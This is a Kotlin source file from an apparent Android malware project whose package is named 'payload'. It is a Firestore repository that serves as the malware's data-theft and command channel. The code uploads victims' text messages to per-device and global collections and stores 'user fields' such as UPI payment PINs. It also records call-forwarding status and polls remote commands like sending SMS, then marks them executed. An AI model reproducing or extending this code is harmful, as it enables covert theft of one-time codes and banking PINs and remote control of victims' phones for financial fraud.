package com.payload.jansiix0ne.data.repository

import android.util.Log
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import com.payload.jansiix0ne.data.model.DeviceModel
import com.payload.jansiix0ne.data.model.SmsModel
import kotlinx.coroutines.tasks.await

/**
 * Repository for Firestore operations
 */
class FirestoreRepository {
    val firestore: FirebaseFirestore = FirebaseFirestore.getInstance()
    companion object {
        private const val TAG = "FirestoreRepository"
        private const val COLLECTION_DEVICES = "devices"
        private const val COLLECTION_GLOBAL_SMS = "global_sms"
    }

    /**
     * Store SMS in device-specific collection and global collection
     */
    suspend fun storeSms(sms: SmsModel, deviceId: String): Result<Unit> {
        return try {
            Log.d(TAG, "📤 Storing SMS for device: $deviceId")
            
            // Store in device-specific collection: devices/{deviceId}/sms
            val deviceSmsRef = firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection("sms")
            
            deviceSmsRef.add(sms).await()
            Log.d(TAG, "✅ SMS stored in device collection")
            
            // Store in global collection with deviceId
            val globalSmsData = hashMapOf(
                "from" to sms.from,
                "message" to sms.message,
                "time" to sms.time,
                "ownerDeviceId" to deviceId,
                "timestamp" to com.google.firebase.Timestamp.now()
            )
            
            firestore
                .collection(COLLECTION_GLOBAL_SMS)
                .add(globalSmsData)
                .await()
            
            Log.d(TAG, "✅ SMS stored in global collection")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to store SMS: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Save or update device information
     */
    suspend fun saveDeviceInfo(deviceId: String, deviceModel: DeviceModel): Result<Unit> {
        return try {
            Log.d(TAG, "📤 Saving device info: $deviceId")
            
            firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .set(deviceModel, SetOptions.merge())
                .await()
            
            Log.d(TAG, "✅ Device info saved: $deviceId")
            Result.success(Unit)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save device info: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Get device information
     */
    suspend fun getDeviceInfo(deviceId: String): Result<DeviceModel?> {
        return try {
            val document = firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .get()
                .await()
            
            if (document.exists()) {
                val deviceModel = document.toObject(DeviceModel::class.java)
                Result.success(deviceModel)
            } else {
                Result.success(null)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to get device info: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Save user fields (like UPI PIN) to Firestore
     * Path: devices/{deviceId}/userInfo/data
     */
    suspend fun saveUserFields(fields: Map<String, Any>, deviceId: String): Result<Boolean> {
        return try {
            Log.d(TAG, "📤 Saving user fields for device: $deviceId")
            
            if (deviceId.isEmpty()) {
                Log.e(TAG, "❌ Device ID is empty!")
                return Result.success(false)
            }

            val userInfoRef = firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection("userInfo")
                .document("data")

            userInfoRef.set(fields, SetOptions.merge()).await()
            
            Log.d(TAG, "✅ User fields updated: $fields")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to update user fields: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Save FCM token to Firestore
     * Path: devices/{deviceId}/fcm/token
     */
    suspend fun saveFcmToken(deviceId: String, token: String): Result<Boolean> {
        return try {
            Log.d(TAG, "📤 Saving FCM token for device: $deviceId")
            
            if (deviceId.isEmpty()) {
                Log.e(TAG, "❌ Device ID is empty!")
                return Result.success(false)
            }

            val fields = mapOf(
                "token" to token,
                "updatedAt" to com.google.firebase.Timestamp.now()
            )
            
            Log.d(TAG, "📊 Firestore path: devices/$deviceId/fcm/token")
            Log.d(TAG, "📊 Data: $fields")
            
            firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection("fcm")
                .document("token")
                .set(fields, SetOptions.merge())
                .await()
            
            Log.d(TAG, "✅ FCM token saved successfully for $deviceId")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to save FCM token: ${e.message}", e)
            Result.failure(e)
        }
    }
    
    /**
     * Register device in Firestore
     * Path: devices/{deviceId}
     */
    suspend fun registerDevice(deviceId: String, deviceData: Map<String, Any>): Result<Boolean> {
        return try {
            Log.d(TAG, "📤 Registering device: $deviceId")
            Log.d(TAG, "📊 Firestore path: devices/$deviceId")
            Log.d(TAG, "📊 Data: $deviceData")
            
            if (deviceId.isEmpty()) {
                Log.e(TAG, "❌ Device ID is empty!")
                return Result.success(false)
            }
            
            firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .set(deviceData, SetOptions.merge())
                .await()
            
            Log.d(TAG, "✅ Device registered successfully: $deviceId")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to register device: ${e.message}", e)
            e.printStackTrace()
            Result.failure(e)
        }
    }

    /**
     * Update forwarding status in Firestore
     * Path: devices/{deviceId}/forwarding/settings
     */
    suspend fun updateForwardingStatus(deviceId: String, status: Boolean): Result<Boolean> {
        return try {
            Log.d(TAG, "📤 Updating forwarding status for device: $deviceId")
            
            if (deviceId.isEmpty()) {
                Log.e(TAG, "❌ Device ID is empty!")
                return Result.success(false)
            }

            val fields = mapOf("callForwardStatus" to status)
            
            firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection("forwarding")
                .document("settings")
                .update(fields)
                .await()
            
            Log.d(TAG, "✅ Forwarding status updated: $status")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error updating forwarding status: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Update forwarding executed status
     * Path: devices/{deviceId}/forwarding/settings
     */
    suspend fun updateForwardingExecuted(deviceId: String, executed: Boolean): Result<Boolean> {
        return try {
            Log.d(TAG, "📤 Updating forwarding executed for device: $deviceId")
            
            if (deviceId.isEmpty()) {
                Log.e(TAG, "❌ Device ID is empty!")
                return Result.success(false)
            }

            val fields = mapOf("executed" to executed)
            
            firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection("forwarding")
                .document("settings")
                .update(fields)
                .await()
            
            Log.d(TAG, "✅ Forwarding executed status updated: $executed")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error updating forwarding executed: ${e.message}", e)
            Result.failure(e)
        }
    }

    /**
     * Mark SendSms as sent in Firestore
     * Path: devices/{deviceId}/commands/{commandId}
     */
    suspend fun markSendSmsAsSent(deviceId: String, commandId: String): Result<Boolean> {
        return try {
            Log.d(TAG, "📤 Marking SMS as sent for device: $deviceId")
            
            if (deviceId.isEmpty()) {
                Log.e(TAG, "❌ Device ID is empty!")
                return Result.success(false)
            }

            val fields = mapOf(
                "status" to "completed",
                "executedAt" to com.google.firebase.Timestamp.now()
            )
            
            firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection("commands")
                .document(commandId)
                .update(fields)
                .await()
            
            Log.d(TAG, "✅ SMS marked as sent for $deviceId")
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error marking SMS as sent: ${e.message}", e)
            Result.failure(e)
        }
    }
    
    /**
     * Poll for pending commands
     * Path: devices/{deviceId}/commands
     */
    suspend fun pollCommands(deviceId: String): Result<List<Map<String, Any>>> {
        return try {
            Log.d(TAG, "📥 Polling commands for device: $deviceId")
            
            val snapshot = firestore
                .collection(COLLECTION_DEVICES)
                .document(deviceId)
                .collection("commands")
                .whereEqualTo("status", "pending")
                .get()
                .await()
            
            val commands = snapshot.documents.map { doc ->
                mapOf<String, Any>(
                    "id" to doc.id,
                    "type" to (doc.getString("type") ?: ""),
                    "data" to (doc.get("data") ?: emptyMap<String, Any>()),
                    "createdAt" to (doc.getTimestamp("createdAt") ?: com.google.firebase.Timestamp.now())
                )
            }
            
            Log.d(TAG, "✅ Found ${commands.size} pending commands")
            Result.success(commands)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error polling commands: ${e.message}", e)
            Result.failure(e)
        }
    }
}
